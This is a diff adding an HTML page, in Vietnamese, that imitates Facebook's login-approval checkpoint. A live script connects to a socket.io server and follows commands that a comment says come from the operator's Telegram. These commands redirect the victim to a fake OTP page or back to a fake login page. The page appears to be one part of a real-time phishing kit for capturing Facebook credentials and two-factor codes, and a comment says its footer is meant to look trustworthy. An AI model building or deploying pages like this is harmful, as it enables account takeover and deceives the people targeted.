@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Phê duyệt đăng nhập</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Màu sắc chuẩn Facebook Design System */
+        :root {
+            --fb-blue: #1877f2;
+            --text-black: #1c1e21;
+            --text-gray: #606770;
+            --border-color: #dddfe2;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Header mỏng chuẩn app */
+        .app-header {
+            width: 100%;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid var(--border-color);
+            background: #fff;
+            position: sticky;
+            top: 0;
+        }
+        .app-header h2 {
+            color: var(--fb-blue);
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 500px;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        /* Icon Tablet/Mobile chuẩn Checkpoint */
+        .icon-wrapper {
+            margin: 20px 0 30px;
+            display: flex;
+            justify-content: center;
+        }
+        .icon-circle {
+            width: 100px;
+            height: 100px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon-circle i {
+            font-size: 45px;
+            color: var(--fb-blue);
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-black);
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        p {
+            font-size: 15px;
+            color: var(--text-gray);
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* Thanh trạng thái chờ chuẩn Facebook */
+        .loading-status {
+            background: #f0f2f5;
+            padding: 16px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ddd;
+            border-top: 2px solid var(--fb-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .status-text {
+            color: var(--fb-blue);
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* Link ẩn/hiện mã xác nhận */
+        .bottom-links {
+            margin-top: 15px;
+        }
+        .btn-link {
+            color: var(--fb-blue);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        /* Phần chân trang trợ giúp - Nhìn cực uy tín */
+        .help-section {
+            width: 100%;
+            padding: 20px;
+            background: #f5f6f7;
+            margin-top: auto;
+            border-top: 1px solid var(--border-color);
+        }
+        .help-content {
+            font-size: 13px;
+            color: var(--text-gray);
+            text-align: left;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .help-content b { color: #4b4f56; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="app-header">
+        <h2>facebook</h2>
+    </div>
+
+    <div class="main-container">
+        <div class="icon-wrapper">
+            <div class="icon-circle">
+                <i class="fas fa-tablet-alt"></i>
+            </div>
+        </div>
+
+        <h1>Bạn đã yêu cầu phê duyệt đăng nhập?</h1>
+        <p>Kiểm tra thông báo trên điện thoại di động hoặc máy tính bảng khác để phê duyệt lần đăng nhập này.</p>
+
+        <div class="loading-status">
+            <div class="spinner"></div>
+            <span class="status-text">Đang chờ phê duyệt...</span>
+        </div>
+
+        <div class="bottom-links">
+            <span class="btn-link" onclick="handleOTP()">Sử dụng mã xác nhận để phê duyệt</span>
+        </div>
+    </div>
+
+    <div class="help-section">
+        <div class="help-content">
+            <b>Chúng tôi đã gửi thông báo đến:</b><br>
+            Thiết bị iPhone 15 Pro Max (hoặc thiết bị thường dùng khác). Mở ứng dụng Facebook của bạn và nhấn <b>Có</b> để xác nhận.
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        const socket = io('http://127.0.0.1:5000');
+
+        function handleOTP() {
+            // Chuyển sang file otp.html mà bạn đã có
+            window.location.href = "otp.html";
+        }
+
+        // Nhận lệnh từ Telegram của bạn
+        socket.on('server_command', function(data) {
+            if(data.action === 'error') {
+                alert("Thiết bị từ chối phê duyệt. Vui lòng đăng nhập lại.");
+                window.location.href = "login.html";
+            }
+            else if(data.action === 'otp') {
+                handleOTP();
+            }
+        });
+    </script>
+</body>
+</html>
